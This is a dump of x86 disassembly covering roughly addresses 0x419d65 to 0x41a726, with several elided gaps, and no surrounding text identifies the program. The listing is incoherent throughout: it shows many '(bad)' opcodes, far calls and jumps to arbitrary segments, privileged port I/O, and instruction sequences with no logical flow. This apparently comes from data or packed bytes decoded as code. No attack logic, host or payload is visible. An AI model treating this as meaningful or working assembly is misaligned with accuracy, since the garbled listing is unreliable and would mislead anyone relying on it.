  419d65:	in     al,0xa0
  419d67:	popf   
  419d68:	pop    esi
  419d69:	xchg   esp,edi
  419d6b:	sbb    bh,bh
  419d6d:	daa    
  419d6e:	mov    dl,0xd1
  419d70:	adc    cl,BYTE PTR [edx]
  419d72:	sar    BYTE PTR [ecx],cl
  419d74:	dec    ebx
  419d75:	and    BYTE PTR [ebp-0x41],ch
  419d78:	pop    edi
  419d79:	xor    eax,0x9b7ee384
  419d7e:	cmp    al,0x6c
  419d80:	push   esp
  419d81:	aas    
  419d82:	aaa    
  419d83:	js     0x419d69
  419d85:	jbe    0x419d4b
  419d87:	mov    eax,0x5218ce9
  419d8c:	add    al,0xb9
  419d8e:	addr16 clc 
  419d90:	mov    ebp,0x6b77c506
  419d95:	js     0x419da9
  419d97:	dec    ecx
  419d98:	scas   eax,DWORD PTR es:[edi]
  419d99:	es cwde 
  419d9b:	mov    bl,0xfc
  419d9d:	push   ecx
  419d9e:	addr16 push ebx
  419da0:	loop   0x419d3e
  419da2:	sub    dh,BYTE PTR [eax+eiz*2-0xa]
  419da6:	cli    
  419da7:	xchg   DWORD PTR [ecx+0x54ea6715],edi
  419dad:	call   0xed10:0x95031c0a
  419db4:	jb     0x419d68
  419db6:	std    
  419db7:	out    0xdd,al
  419db9:	cmp    bl,0x4a
  419dbc:	or     DWORD PTR [ebp+0x90a0e3],edi
  419dc2:	jmp    0x419d6d
  419dc4:	dec    ebx
  419dc5:	push   esi
  419dc6:	outs   dx,DWORD PTR ds:[esi]
  419dc7:	sbb    edx,ebp
  419dc9:	adc    al,0x8
  419dcb:	and    BYTE PTR [ebx+0x34554d4],0xbc
  419dd2:	cmp    BYTE PTR [edi-0x53],dh
  419dd5:	aad    0xda
  419dd7:	add    ah,ch
  419dd9:	and    DWORD PTR [eax],ecx
  419ddb:	mov    ah,0x7b
  419ddd:	and    bl,BYTE PTR [edi+0x6e58d5a4]
  419de3:	call   0xfb9d:0x1f35e083
  419dea:	(bad)  
  419deb:	into   
  419dec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ded:	mov    bl,0xc6
  419def:	gs or  al,0x6
  419df2:	sub    bl,BYTE PTR [esi-0x6c]
  419df5:	loop   0x419e2e
  419df7:	ds jg  0x419e14
  419dfa:	cwde   
  419dfb:	sub    BYTE PTR [ecx],dl
  419dfd:	inc    edi
  419dfe:	cmp    BYTE PTR [ebx+0x397d050d],0xb0
  419e05:	sub    DWORD PTR [ebx],esp
  419e07:	mul    al
  419e09:	sub    esi,DWORD PTR [ecx-0x2a]
  419e0c:	test   edx,edi
  419e0e:	inc    DWORD PTR [eax]
  419e10:	or     al,0x93
  419e12:	sub    al,BYTE PTR [ecx]
  419e14:	jne    0x419e37
  419e16:	mov    ebx,0xad1b7d9
  419e1b:	xor    al,0xc3
  419e1d:	inc    ebx
  419e1e:	pop    edi
  419e1f:	mov    ah,0x1f
  419e21:	pusha  
  419e22:	nop
  419e23:	es out 0x9c,al
  419e26:	lock and eax,esp
  419e29:	xchg   edx,eax
  419e2a:	inc    bh
  419e2c:	shr    DWORD PTR ds:0x2a460008,cl
  419e32:	cs xor al,0x3d
	...
  419e95:	add    BYTE PTR [edi+0x5fc517d8],al
  419e9b:	iret   
  419e9c:	xlat   BYTE PTR ds:[ebx]
  419e9d:	fimul  DWORD PTR [eax-0xaaf3a60]
  419ea3:	cdq    
  419ea4:	dec    esi
  419ea5:	jne    0x419e54
  419ea7:	adc    BYTE PTR [ecx],al
  419ea9:	add    BYTE PTR [edi],al
  419eab:	add    DWORD PTR [eax],eax
  419ead:	add    BYTE PTR [edi+0x1f],ch
  419eb0:	fdiv   DWORD PTR [ecx+ecx*8-0x49386a7d]
  419eb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419eb8:	mov    sp,0x3f28
  419ebc:	push   ebp
  419ebd:	lahf   
  419ebe:	adc    al,BYTE PTR [ebp+0xd]
  419ec1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ec2:	idiv   DWORD PTR [ebp-0x4d]
  419ec5:	add    eax,esi
  419ec7:	jmp    0x59897172
  419ecc:	pusha  
  419ecd:	push   ebp
  419ece:	and    BYTE PTR ds:0xc8469dde,ah
  419ed4:	cdq    
  419ed5:	push   eax
  419ed6:	(bad)  
  419ed7:	(bad)  
  419ed8:	sti    
  419ed9:	mov    edx,0x9d0dcf99
  419ede:	ins    DWORD PTR es:[edi],dx
  419edf:	mov    eax,0xfc2ed98f
  419ee4:	adc    bl,bl
  419ee6:	add    al,0xb2
  419ee8:	jp     0x419f4b
  419eea:	std    
  419eeb:	dec    ebp
  419eec:	mov    WORD PTR [ecx-0x473c2e39],ss
  419ef2:	out    0xb6,eax
  419ef4:	xor    BYTE PTR [ecx],al
  419ef6:	jnp    0x419eb4
  419ef8:	adc    eax,0x70f817c2
  419efd:	push   ds
  419efe:	mov    dh,ah
  419f00:	js     0x419f5f
  419f02:	dec    esi
  419f03:	outs   dx,BYTE PTR ds:[esi]
  419f04:	call   0x58febb32
  419f09:	nop
  419f0a:	in     al,dx
  419f0b:	inc    edi
  419f0c:	call   0x9db3:0x76e9958e
  419f13:	xchg   ebp,eax
  419f14:	les    ecx,FWORD PTR [edi]
  419f16:	jle    0x419ea7
  419f18:	sub    eax,0x9eaeeb53
  419f1d:	cmp    al,0x3a
  419f1f:	fwait
  419f20:	xor    eax,0xb0f80fe6
  419f25:	cmp    al,0x66
  419f27:	daa    
  419f28:	pop    ebx
  419f29:	test   eax,0x775a2d0c
  419f2e:	mov    bh,BYTE PTR [esi-0x3668b9c3]
  419f34:	stc    
  419f35:	iret   
  419f36:	push   edi
  419f37:	xor    bh,BYTE PTR cs:[ebx+0x71]
  419f3b:	imul   esp,esp,0xd9990e67
  419f41:	ror    bh,0x8c
  419f44:	xchg   ebp,eax
  419f45:	xor    DWORD PTR [ebx+0x3aaa10cd],esp
  419f4b:	jmp    0xd5d7:0xdbe33607
  419f52:	pop    esp
  419f53:	out    dx,eax
  419f54:	fwait
  419f55:	retf   
  419f56:	retf   0xe441
  419f59:	arpl   bp,cx
  419f5b:	int    0x71
  419f5d:	and    eax,0xc56c8605
  419f62:	dec    eax
  419f63:	and    BYTE PTR [ebx],cl
  419f65:	push   edi
  419f66:	jmp    0x64c2857d
  419f6b:	test   DWORD PTR [esi+0x1b58aaaa],edx
  419f71:	call   0x8789:0x18736d75
  419f78:	daa    
  419f79:	aaa    
  419f7a:	lock mov ebp,0x914b593b
  419f80:	jle    0x419f77
  419f82:	sub    DWORD PTR [ecx+0x46],ecx
  419f85:	push   eax
  419f86:	shr    DWORD PTR [esi],cl
  419f88:	sar    BYTE PTR [edi+0x749a3270],cl
  419f8e:	push   cs
  419f8f:	aaa    
  419f90:	xor    esi,DWORD PTR [ecx]
  419f92:	loope  0x419fd7
  419f94:	sbb    ebp,DWORD PTR [eax+esi*8+0x6dc57658]
  419f9b:	ins    BYTE PTR es:[edi],dx
  419f9c:	in     eax,dx
  419f9d:	in     al,0xe8
  419f9f:	sbb    al,0x60
  419fa1:	in     eax,dx
  419fa2:	inc    BYTE PTR [edi]
  419fa4:	mov    ebx,0xd41c27f0
  419fa9:	dec    esi
  419faa:	fwait
  419fab:	rcr    DWORD PTR [esi+ecx*8+0x40],cl
  419faf:	std    
  419fb0:	repz mov ebp,0x2981b6
	...
  41a016:	dec    esi
  41a017:	jmp    0x41a043
  41a019:	dec    esi
  41a01a:	scas   eax,DWORD PTR es:[edi]
  41a01b:	iret   
  41a01c:	outs   dx,BYTE PTR ds:[esi]
  41a01d:	jmp    0x41a015
  41a01f:	in     al,dx
  41a020:	pop    ds
  41a021:	outs   dx,DWORD PTR ds:[esi]
  41a022:	sbb    bl,BYTE PTR [edx+0x11b44c69]
  41a028:	add    DWORD PTR [eax],eax
  41a02a:	pop    es
  41a02b:	add    DWORD PTR [eax],eax
  41a02d:	add    BYTE PTR [eax],dh
  41a02f:	and    eax,DWORD PTR [ebp-0x5b]
  41a032:	mov    cx,0x3b54
  41a036:	jmp    0x419ff2
  41a038:	mov    bl,0x5d
  41a03a:	test   BYTE PTR [ecx-0x54],al
  41a03d:	inc    eax
  41a03e:	(bad)  
  41a040:	jle    0x41a048
  41a042:	push   ebp
  41a043:	xor    eax,0x371fdf55
  41a048:	dec    ecx
  41a049:	mov    cl,0xee
  41a04b:	jno    0x41a09c
  41a04d:	and    DWORD PTR [edx-0x1723d843],edx
  41a053:	fsubr  QWORD PTR [esp+edi*4]
  41a056:	dec    ecx
  41a057:	mov    BYTE PTR [ebp-0x601b1fb4],cl
  41a05d:	add    eax,0x86581d34
  41a062:	call   0x802b:0x99237abc
  41a069:	xor    eax,0x9b157140
  41a06e:	xchg   ecx,eax
  41a06f:	pop    es
  41a070:	pop    esi
  41a071:	xchg   ebx,eax
  41a072:	xchg   edx,eax
  41a073:	lds    edi,FWORD PTR [edi-0x294a5843]
  41a079:	sub    BYTE PTR ds:0x1661fdf1,bh
  41a07f:	inc    ecx
  41a080:	or     al,0xec
  41a082:	push   eax
  41a083:	aam    0xdb
  41a085:	xchg   DWORD PTR cs:[edi],eax
  41a088:	and    bh,ah
  41a08a:	idiv   BYTE PTR [edx]
  41a08c:	cmp    BYTE PTR [ebx+0x24],0xa1
  41a090:	sub    edi,esi
  41a092:	loopne 0x41a103
  41a094:	xchg   DWORD PTR [ebx],ecx
  41a096:	sahf   
  41a097:	not    DWORD PTR [edx]
  41a099:	popa   
  41a09a:	mov    edx,0x6929a1c5
  41a09f:	retf   
  41a0a0:	aad    0xe7
  41a0a2:	mov    ecx,0xfd379fd
  41a0a7:	mov    al,0x3c
  41a0a9:	mov    ebx,ss
  41a0ab:	jg     0x41a10f
  41a0ad:	push   ebp
  41a0ae:	test   DWORD PTR [esp+ebx*4-0x48],0x201a640e
  41a0b6:	imul   ebx,DWORD PTR [edx+0x40],0xffffffa1
  41a0ba:	retf   0x65f2
  41a0bd:	(bad)  
  41a0bf:	push   eax
  41a0c0:	and    al,0x8
  41a0c2:	pop    esi
  41a0c3:	inc    ecx
  41a0c4:	inc    ebx
  41a0c5:	iret   
  41a0c6:	jmp    0xf0419789
  41a0cb:	fdiv   DWORD PTR [esi+0x32dfa9a9]
  41a0d1:	xchg   ebp,eax
  41a0d2:	test   eax,0x321d19f8
  41a0d7:	repnz arpl WORD PTR [esi+ecx*4],di
  41a0db:	in     al,dx
  41a0dc:	mov    bl,0xf0
  41a0de:	nop    ebp
  41a0e1:	fsubr  DWORD PTR [eax-0xf486b05]
  41a0e7:	retf   
  41a0e8:	in     al,0xdc
  41a0ea:	jnp    0x41a09d
  41a0ec:	(bad)  
  41a0ed:	sub    BYTE PTR [eax],ah
  41a0ef:	loopne 0x41a161
  41a0f1:	jbe    0x41a0bb
  41a0f3:	dec    esi
  41a0f4:	push   ecx
  41a0f5:	stos   BYTE PTR es:[edi],al
  41a0f6:	xlat   BYTE PTR ds:[ebx]
  41a0f7:	loope  0x41a157
  41a0f9:	mov    edx,0xc0e43947
  41a0fe:	xor    dh,BYTE PTR [ecx]
  41a100:	ja     0x41a133
  41a102:	sub    bl,al
  41a104:	jb     0x41a0f1
  41a106:	cmc    
  41a107:	push   ebp
  41a108:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a109:	iret   
  41a10a:	push   cs
  41a10b:	shl    DWORD PTR [esp+edx*1-0x60c80431],cl
  41a112:	jmp    0xa022:0x7c897d2c
  41a119:	les    eax,FWORD PTR [esi]
  41a11b:	mov    esp,0xfc055544
  41a120:	mov    WORD PTR [esi-0x5f],?
  41a123:	cli    
  41a124:	dec    eax
  41a125:	or     bl,BYTE PTR [esp+edx*2+0x3d3da867]
  41a12c:	sub    al,cl
  41a12e:	sub    DWORD PTR [esi+0x10],ecx
  41a131:	push   esp
  41a132:	idiv   DWORD PTR [eax]
  41a134:	fiadd  DWORD PTR [eax]
	...
  41a196:	sbb    al,0xc
  41a198:	std    
  41a199:	sbb    ebp,edi
  41a19b:	stc    
  41a19c:	cld    
  41a19d:	or     eax,0xe0cd0383
  41a1a2:	jb     0x41a21b
  41a1a4:	adc    eax,0x112bb46
  41a1a9:	add    BYTE PTR [edi],al
  41a1ab:	add    DWORD PTR [eax],eax
  41a1ad:	add    BYTE PTR [edi-0x47],bl
  41a1b0:	lock push edi
  41a1b2:	js     0x41a1d0
  41a1b4:	scas   eax,DWORD PTR es:[edi]
  41a1b5:	mov    esp,0xbc5cb065
  41a1ba:	sub    al,0x41
  41a1bc:	pop    eax
  41a1be:	pop    edi
  41a1bf:	push   es
  41a1c0:	push   0x868d8804
  41a1c5:	jnp    0x41a1b0
  41a1c7:	loope  0x41a15a
  41a1c9:	ror    DWORD PTR [ecx-0x30],1
  41a1cc:	sbb    esi,DWORD PTR [edx+0x6c]
  41a1cf:	xchg   esi,eax
  41a1d0:	rcr    BYTE PTR [ecx+edx*4],1
  41a1d3:	jnp    0x41a23b
  41a1d5:	push   ecx
  41a1d6:	mov    esi,0x88045b1d
  41a1db:	std    
  41a1dc:	outs   dx,BYTE PTR ds:[esi]
  41a1dd:	inc    ebp
  41a1de:	rol    DWORD PTR [eax],0x5
  41a1e1:	push   0xc407d0fe
  41a1e6:	mov    bh,0x86
  41a1e8:	enter  0x7a29,0xe8
  41a1ec:	int    0x42
  41a1ee:	pop    ss
  41a1ef:	or     eax,0xa41e89fe
  41a1f4:	pop    edi
  41a1f5:	push   0xb26ec663
  41a1fa:	test   eax,0xb36c6bee
  41a1ff:	push   esi
  41a200:	sub    bh,al
  41a202:	in     eax,0x85
  41a204:	fs xchg esp,eax
  41a206:	jecxz  0x41a248
  41a208:	sub    al,BYTE PTR [eax+0x3d]
  41a20b:	test   al,0x8c
  41a20d:	mov    esp,?
  41a20f:	jne    0x41a197
  41a211:	pop    ecx
  41a212:	pop    ss
  41a213:	push   ecx
  41a214:	dec    edx
  41a215:	jo     0x41a1f3
  41a217:	rcr    BYTE PTR [eax+0x5260f564],0x63
  41a21e:	nop
  41a21f:	mov    WORD PTR [edx-0x1f14c1aa],es
  41a225:	pop    ds
  41a226:	adc    esp,DWORD PTR [ebx+0x67e572eb]
  41a22c:	iret   
  41a22d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a22e:	nop
  41a22f:	shl    BYTE PTR [eax+0x6bab9fee],cl
  41a235:	mov    cl,0xdb
  41a237:	loopne 0x41a1c1
  41a239:	dec    eax
  41a23a:	fldl2t 
  41a23c:	repz mov db7,esp
  41a240:	shr    BYTE PTR [edi],0xa2
  41a243:	or     esi,DWORD PTR [edx+0x34190b58]
  41a249:	mov    al,0x43
  41a24b:	xchg   ecx,eax
  41a24c:	dec    ecx
  41a24d:	out    0x6c,al
  41a24f:	inc    esi
  41a250:	out    0xf5,al
  41a252:	inc    eax
  41a253:	add    eax,0x313b03b9
  41a258:	add    DWORD PTR [eax-0x4e],esi
  41a25b:	imul   esi,edx,0x18fb5846
  41a261:	cmp    BYTE PTR [ebx+edi*2-0x25],ah
  41a265:	sub    esi,DWORD PTR [ebx+0x6]
  41a268:	int    0x12
  41a26a:	jne    0x41a2c7
  41a26c:	pop    edi
  41a26d:	data16 sar BYTE PTR [ecx-0x7e],1
  41a271:	loopne 0x41a206
  41a273:	push   edi
  41a274:	ss test al,0x87
  41a277:	ins    BYTE PTR es:[edi],dx
  41a278:	pop    esi
  41a279:	sbb    DWORD PTR [edi+0x5181c6c2],ebp
  41a27f:	jp     0x41a21b
  41a281:	icebp  
  41a282:	aad    0xd2
  41a284:	xchg   dh,dl
  41a286:	lahf   
  41a287:	xchg   ebp,eax
  41a288:	add    al,0xdd
  41a28a:	int3   
  41a28b:	mov    ebx,0xd49dcbf5
  41a290:	ror    BYTE PTR [ebp+ebx*2-0x22e59132],0x8e
  41a298:	sar    BYTE PTR [edi-0x2ed39da6],cl
  41a29e:	add    eax,0x3d7ec909
  41a2a3:	pop    ds
  41a2a4:	imul   ecx,ebx,0x7abecc93
  41a2aa:	mov    esi,0x313f1b15
  41a2af:	stos   BYTE PTR es:[edi],al
  41a2b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2b1:	ficom  WORD PTR [edi+0x65]
  41a2b4:	cdq    
	...
  41a315:	add    bh,dh
  41a317:	pop    eax
  41a318:	test   al,0x13
  41a31a:	scas   eax,DWORD PTR es:[edi]
  41a31b:	repz (bad) 
  41a31d:	cld    
  41a31e:	arpl   ax,bx
  41a320:	shl    DWORD PTR [eax+0x4d64a296],0xc2
  41a327:	adc    eax,DWORD PTR [ecx]
  41a329:	add    BYTE PTR [edi],al
  41a32b:	add    DWORD PTR [eax],eax
  41a32d:	add    BYTE PTR [edi+0x56],ch
  41a330:	jmp    0x661b:0x8f078389
  41a337:	(bad)
  41a33a:	and    eax,0xe2057aa0
  41a33f:	dec    esp
  41a340:	push   0xffffffdc
  41a342:	scas   al,BYTE PTR es:[edi]
  41a343:	add    eax,0x10959d9e
  41a348:	push   ss
  41a349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a34a:	imul   edx,esi,0xc893f8a9
  41a350:	enter  0x7df,0x31
  41a354:	ja     0x41a37c
  41a356:	pop    esp
  41a357:	cmp    BYTE PTR [edi],ah
  41a359:	cmovnp ebp,DWORD PTR [edi+0x7fb94bac]
  41a360:	scas   al,BYTE PTR es:[edi]
  41a361:	in     eax,0xe3
  41a363:	mov    DWORD PTR [ecx],ebx
  41a365:	cmp    al,0x11
  41a367:	cld    
  41a368:	pop    edi
  41a369:	lods   al,BYTE PTR ds:[esi]
  41a36a:	add    BYTE PTR [ecx],cl
  41a36c:	cmc    
  41a36d:	js     0x41a34d
  41a36f:	xchg   edx,ecx
  41a371:	pop    ebx
  41a372:	loopne 0x41a3ca
  41a374:	jb     0x41a32a
  41a376:	aaa    
  41a377:	inc    esp
  41a378:	jbe    0x41a37f
  41a37a:	cmp    DWORD PTR [edi+0x5a],esp
  41a37d:	mov    ds:0xc55bc226,al
  41a382:	retf   
  41a383:	jge    0x41a334
  41a385:	adc    al,0x38
  41a387:	and    al,0xc2
  41a389:	das    
  41a38a:	push   ecx
  41a38b:	sti    
  41a38c:	sbb    ebx,DWORD PTR [esi-0x77]
  41a38f:	cmp    dl,BYTE PTR [edi+0x1c]
  41a392:	sub    al,BYTE PTR [ebx-0x61]
  41a395:	and    BYTE PTR [ecx+0x73],bl
  41a398:	inc    esp
  41a399:	jb     0x41a37d
  41a39b:	push   ebx
  41a39c:	push   ebp
  41a39d:	mov    DWORD PTR [ecx-0x468c5a7f],esp
  41a3a3:	in     eax,0x56
  41a3a5:	fcom   QWORD PTR [esi-0x17]
  41a3a8:	push   edi
  41a3a9:	imul   ebp,DWORD PTR [ebx+ecx*2+0x4e],0x4cf73db6
  41a3b1:	sub    BYTE PTR [ecx+edx*4+0x34],cl
  41a3b5:	enter  0xf06f,0xfe
  41a3b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3ba:	jne    0x41a3f4
  41a3bc:	cmp    dl,BYTE PTR [eax+ebp*2+0x1bf18536]
  41a3c3:	sub    eax,0xf36fb247
  41a3c8:	jmp    0x3f64:0x5c94ade1
  41a3cf:	add    dh,cl
  41a3d1:	jmp    0x41a382
  41a3d3:	jecxz  0x41a3a9
  41a3d5:	lahf   
  41a3d6:	enter  0xc76a,0x6d
  41a3da:	inc    edi
  41a3db:	imul   ebp,DWORD PTR [ebx+eax*1+0x5eadaff7],0x6fc92fd8
  41a3e6:	jg     0x41a3fe
  41a3e8:	mov    DWORD PTR [eax],0xcd9121c4
  41a3ee:	inc    eax
  41a3ef:	call   0xa221:0x9eeb456a
  41a3f6:	stc    
  41a3f7:	jns    0x41a40b
  41a3f9:	sbb    DWORD PTR [edi+0x55e7e4f9],ecx
  41a3ff:	jne    0x41a3be
  41a401:	lods   al,BYTE PTR ds:[esi]
  41a402:	icebp  
  41a403:	(bad)  
  41a404:	xchg   ebx,eax
  41a405:	(bad)  
  41a406:	cmp    esp,edi
  41a408:	push   esi
  41a409:	call   0x7f471321
  41a40e:	mov    ds:0xfc63add5,eax
  41a413:	or     BYTE PTR [edx+0xc242e0],0x83
  41a41a:	in     eax,0xee
  41a41c:	mov    edx,DWORD PTR [ecx-0x68838651]
  41a422:	fisubr WORD PTR [ebp+0x22]
  41a425:	jb     0x41a486
  41a427:	or     eax,0xf6d0d864
  41a42c:	pop    edx
  41a42d:	cmp    al,0xc
  41a42f:	inc    esi
  41a430:	xlat   BYTE PTR ds:[ebx]
  41a431:	sub    ah,bl
  41a433:	outs   dx,DWORD PTR ds:[esi]
  41a434:	js     0x41a436
	...
  41a496:	mov    edi,0xff0fcf82
  41a49b:	dec    edi
  41a49c:	push   DWORD PTR [edx+0x6df04d13]
  41a4a2:	bound  edi,QWORD PTR [edi]
  41a4a4:	(bad)  
  41a4a5:	xchg   edx,eax
  41a4a6:	leave  
  41a4a7:	adc    al,0x1
  41a4a9:	add    BYTE PTR [edi],al
  41a4ab:	add    DWORD PTR [eax],eax
  41a4ad:	add    BYTE PTR [esi-0x34],ah
  41a4b0:	mov    ebp,0x184bf968
  41a4b5:	in     al,dx
  41a4b6:	push   eax
  41a4b7:	sti    
  41a4b8:	inc    ecx
  41a4b9:	(bad)  
  41a4ba:	sti    
  41a4bb:	test   eax,0xf298fb7d
  41a4c0:	inc    eax
  41a4c1:	add    dh,ch
  41a4c3:	in     eax,0x7e
  41a4c5:	push   ds
  41a4c6:	adc    eax,0xa023d72a
  41a4cb:	sar    DWORD PTR [edx-0x3a8eb15d],1
  41a4d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4d2:	jns    0x41a47c
  41a4d4:	div    DWORD PTR [ecx-0x63aeeed9]
  41a4da:	jne    0x41a46d
  41a4dc:	lahf   
  41a4dd:	mov    cl,0x8c
  41a4df:	retf   
  41a4e0:	xor    dl,BYTE PTR [ebp-0x2]
  41a4e3:	pop    esp
  41a4e4:	mov    ch,0x17
  41a4e6:	jecxz  0x41a4df
  41a4e8:	int3   
  41a4e9:	addr16 push 0x7a
  41a4ec:	mov    dl,0x84
  41a4ee:	mov    esp,0xabe79cb
  41a4f3:	xor    ecx,DWORD PTR [ebx+0x4de6e075]
  41a4f9:	(bad)  
  41a4fa:	popa   
  41a4fb:	in     eax,0x13
  41a4fd:	xchg   edi,eax
  41a4fe:	bound  ebx,QWORD PTR [edi]
  41a500:	inc    edx
  41a501:	or     eax,0xcb66f65b
  41a506:	dec    ebx
  41a507:	xor    al,0x27
  41a509:	test   DWORD PTR [edi-0x207e5789],esi
  41a50f:	sahf   
  41a510:	stos   BYTE PTR es:[edi],al
  41a511:	inc    eax
  41a512:	xor    DWORD PTR [edx],esi
  41a514:	ja     0x41a51b
  41a516:	sub    eax,0x5de6a261
  41a51b:	mov    ah,cl
  41a51d:	(bad)  
  41a51e:	das    
  41a51f:	or     al,0xd
  41a521:	mov    ?,WORD PTR [ebp+ebx*8-0x287cfd18]
  41a528:	enter  0x6b56,0xd6
  41a52c:	cmp    al,BYTE PTR [ebx]
  41a52e:	cmp    al,0x71
  41a530:	jnp    0x41a4da
  41a532:	out    dx,al
  41a533:	mov    BYTE PTR [esi],ah
  41a535:	mov    ecx,0x64f73960
  41a53a:	xor    ch,ah
  41a53c:	jbe    0x41a5ac
  41a53e:	dec    ebp
  41a53f:	test   DWORD PTR [esi+esi*4+0x60],esp
  41a543:	stc    
  41a544:	in     al,0xd2
  41a546:	or     esi,DWORD PTR [edi+0x28]
  41a549:	or     al,0x65
  41a54b:	mov    al,ds:0x8ae0bf0c
  41a550:	in     al,0x9f
  41a552:	push   0x2e
  41a554:	cwde   
  41a555:	add    al,0x73
  41a558:	cmp    DWORD PTR [ebp+0x5a4d39cf],ebx
  41a55e:	sbb    ah,dl
  41a560:	fnstcw WORD PTR [edx]
  41a562:	lea    edx,[edi+edi*1]
  41a565:	sbb    al,0x6b
  41a567:	push   ds
  41a568:	add    al,0x1b
  41a56a:	pop    ecx
  41a56b:	jmp    0x5a230406
  41a570:	pop    edx
  41a571:	mov    es,WORD PTR [eax+ebx*1+0x75]
  41a575:	in     eax,dx
  41a576:	xchg   edi,eax
  41a577:	inc    edx
  41a578:	fistp  DWORD PTR [ecx+0x66]
  41a57b:	leave  
  41a57c:	not    esi
  41a57e:	dec    ebp
  41a57f:	in     al,dx
  41a580:	mov    esp,0x7497aed0
  41a585:	fnsave [eax-0x59]
  41a588:	jo     0x41a51b
  41a58a:	ins    DWORD PTR es:[edi],dx
  41a58b:	inc    edi
  41a58c:	shrd   eax,ebx,0x7a
  41a590:	pop    esp
  41a591:	outs   dx,DWORD PTR ds:[esi]
  41a592:	xlat   BYTE PTR ds:[ebx]
  41a593:	fmul   st(5),st
  41a595:	sbb    DWORD PTR [esi-0x56],ebx
  41a598:	stc    
  41a599:	inc    edi
  41a59a:	shl    BYTE PTR [edi-0x3d0c6cb7],1
  41a5a0:	sti    
  41a5a1:	outs   dx,DWORD PTR ds:[esi]
  41a5a2:	lods   al,BYTE PTR ds:[esi]
  41a5a3:	std    
  41a5a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5a5:	pop    esi
  41a5a6:	xchg   ebp,eax
  41a5a7:	dec    eax
  41a5a8:	pop    eax
  41a5a9:	add    al,0xb5
  41a5ab:	xor    BYTE PTR [esi],dh
  41a5ad:	pop    ecx
  41a5ae:	outs   dx,DWORD PTR ds:[esi]
  41a5af:	shr    DWORD PTR [edi+ebp*1],1
  41a5b2:	les    esp,FWORD PTR [edi-0x74]
	...
  41a615:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a619:	inc    ecx
  41a61a:	ja     0x41a687
  41a61c:	pop    esp
  41a61d:	aas    
  41a61e:	pop    ecx
  41a61f:	jmp    0x41a5e9
  41a621:	mov    edx,0x2cc5f7a0
  41a626:	rcl    BYTE PTR ds:0x1070001,1
  41a62c:	add    BYTE PTR [eax],al
  41a62e:	xor    ebx,ebx
  41a630:	mov    ebp,0x92f5d028
  41a635:	fld    DWORD PTR [eax-0x54]
  41a638:	jne    0x41a68c
  41a63a:	jl     0x41a691
  41a63c:	xor    DWORD PTR [edi],0x477de7dd
  41a642:	(bad)  
  41a643:	jmp    0x41a63f
  41a645:	mov    bl,0x12
  41a647:	sti    
  41a648:	(bad)  
  41a649:	mov    ds:0x6fd6cd4b,eax
  41a64e:	or     al,0xec
  41a650:	cmp    ch,BYTE PTR [eax+0x57a44bfa]
  41a656:	sub    BYTE PTR [esi+esi*2-0x49457b00],cl
  41a65d:	retf   0xaeb7
  41a660:	int    0xba
  41a662:	ss mul BYTE PTR es:[eax+ebp*8+0x36]
  41a668:	out    dx,al
  41a669:	test   al,0x84
  41a66b:	jmp    0x2dfbe8db
  41a670:	cs dec ebx
  41a672:	sti    
  41a673:	push   edi
  41a674:	jp     0x41a6b9
  41a676:	out    0x96,eax
  41a678:	jecxz  0x41a6da
  41a67a:	adc    BYTE PTR fs:[ecx+0x59],al
  41a67e:	push   es
  41a67f:	scas   al,BYTE PTR es:[edi]
  41a680:	xor    DWORD PTR [esi+ebx*8-0xd],esi
  41a684:	daa    
  41a685:	pop    ebp
  41a686:	loopne 0x41a6b8
  41a688:	ins    BYTE PTR es:[edi],dx
  41a689:	popf   
  41a68a:	or     DWORD PTR [ecx+0x28],esi
  41a68d:	sub    eax,0x2a04050e
  41a692:	sub    BYTE PTR [edi],0x1b
  41a695:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a696:	sbb    ah,BYTE PTR [edx]
  41a698:	mov    ah,0xc1
  41a69a:	dec    esp
  41a69b:	bound  ebp,QWORD PTR [eax]
  41a69d:	lds    ebx,FWORD PTR [esi-0x42]
  41a6a0:	lea    edi,[esi+edx*1-0x14]
  41a6a4:	addr16 mov edx,0xab869da1
  41a6aa:	mov    cl,0xdd
  41a6ac:	and    eax,0x1780100f
  41a6b1:	fistp  DWORD PTR [ebp+0x47ec6eb1]
  41a6b7:	test   eax,0xb9caea1e
  41a6bc:	sub    DWORD PTR [edi-0x40],edi
  41a6bf:	int3   
  41a6c0:	pop    es
  41a6c1:	clc    
  41a6c2:	ja     0x41a689
  41a6c4:	cmp    BYTE PTR [ebp+ebp*8+0x73649835],bl
  41a6cb:	mov    ecx,0x37e73fd5
  41a6d0:	push   0xfe09c17a
  41a6d5:	mov    eax,ds:0x2bf099d0
  41a6da:	xor    al,0xfc
  41a6dc:	pop    ss
  41a6dd:	cmp    DWORD PTR [ebp+0x55],edx
  41a6e0:	mov    dh,0xd2
  41a6e2:	in     al,0x1f
  41a6e4:	stos   BYTE PTR es:[edi],al
  41a6e5:	(bad)  
  41a6e6:	ja     0x41a673
  41a6e8:	fistp  QWORD PTR [eax+0x385066a4]
  41a6ee:	sbb    bh,BYTE PTR [ecx+0x3d]
  41a6f1:	fstp   QWORD PTR [ecx]
  41a6f3:	dec    ecx
  41a6f4:	pop    esi
  41a6f5:	sahf   
  41a6f6:	addr16 enter 0x755e,0x93
  41a6fb:	stc    
  41a6fc:	adc    dl,BYTE PTR [eax-0x40]
  41a6ff:	mov    ecx,0xa38de26
  41a704:	and    al,ah
  41a706:	add    ch,BYTE PTR [edi]
  41a708:	mul    edx
  41a70a:	adc    eax,DWORD PTR [edi+0x23162f89]
  41a710:	aad    0x11
  41a712:	push   esp
  41a713:	ins    BYTE PTR es:[edi],dx
  41a714:	push   es
  41a715:	cwde   
  41a716:	xchg   BYTE PTR [edx],ah
  41a718:	cmp    eax,0x64d67c3e
  41a71d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a71e:	mov    BYTE PTR [edi+ebp*2+0xa493b27],ch
  41a725:	out    dx,eax
  41a726:	cli    
